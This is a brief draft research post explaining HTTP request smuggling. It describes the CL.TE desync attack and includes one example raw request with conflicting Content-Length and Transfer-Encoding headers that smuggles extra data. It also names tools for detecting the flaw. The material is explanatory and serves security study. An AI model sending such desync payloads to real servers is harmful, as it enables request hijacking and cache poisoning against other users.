---
type: research
title: "HTTP Request Smuggling — Techniques and Detection"
date: 2024-05-15
tags: ["http", "request-smuggling", "web", "techniques"]
description: "A walkthrough of CL.TE and TE.CL desync attacks."
references:
  - "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn"
draft: true
---

## Overview

HTTP request smuggling exploits ambiguities in how front-end and back-end servers
parse the `Content-Length` and `Transfer-Encoding` headers.

## CL.TE Desync

The front-end uses `Content-Length`, the back-end uses `Transfer-Encoding`.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## Detection

Use Burp Suite's HTTP Request Smuggler extension or the `smuggler.py` tool.
